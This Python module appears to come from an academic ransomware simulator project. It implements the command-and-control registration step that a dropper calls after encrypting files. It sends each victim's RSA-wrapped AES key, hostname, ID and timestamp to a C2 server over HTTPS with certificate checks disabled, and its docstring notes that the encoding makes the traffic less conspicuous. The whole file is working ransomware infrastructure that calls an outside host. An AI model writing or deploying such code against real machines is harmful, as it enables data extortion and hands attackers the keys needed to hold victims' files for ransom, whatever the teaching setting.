"""
c2_client.py — C2 Registration Client
IT360 Project 14: Ransomware Simulator (Academic Use Only)

Handles HTTPS communication from the victim to the C2 server.
Called by dropper.py after RSA key wrapping is complete.

This module is the real implementation of the C2 stub in dropper.py.
When this file exists, dropper.py automatically uses it instead of
the stub.

"""

import base64
import requests
import urllib3

from src.common.config import C2_REGISTER_ENDPOINT


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def send_registration(
    victim_id: str,
    hostname: str,
    wrapped_key_hex: str,
    timestamp: str,
) -> bool:
    """
    POST the RSA-wrapped AES key and victim metadata to the C2 server.

    The wrapped_key arrives from dropper.py as a hex string. It is
    base64-encoded here before transmission — a common pattern in real
    C2 traffic to keep the payload JSON-safe and less conspicuous than
    raw hex in transit.

    Args:
        victim_id      : 16-char hex victim identifier from dropper.
        hostname       : Victim machine hostname from dropper.
        wrapped_key_hex: RSA-OAEP encrypted AES key as hex string.
        timestamp      : ISO timestamp string from dropper.

    Returns:
        bool: True if server returned HTTP 200, False otherwise.
    """
    
    wrapped_key_bytes: bytes = bytes.fromhex(wrapped_key_hex)
    encoded_key: str = base64.b64encode(wrapped_key_bytes).decode()

    payload: dict = {
        "victim_id"           : victim_id,
        "rsa_encrypted_aes_key": encoded_key,
        "hostname"            : hostname,
        "timestamp"           : timestamp,
    }

    try:
        response = requests.post(
            C2_REGISTER_ENDPOINT,
            json=payload,
            verify=False,    
            timeout=10,
        )

        if response.status_code == 200:
            print(f"[C2] Registration successful. Server: {response.text}")
            return True
        else:
            print(f"[C2] Server returned {response.status_code}: {response.text}")
            return False

    except requests.exceptions.ConnectionError:
        print("[C2] Connection refused — is the C2 server running on Kali?")
        return False
    except requests.exceptions.Timeout:
        print("[C2] Connection timed out.")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[C2] Request failed: {e}")
        return False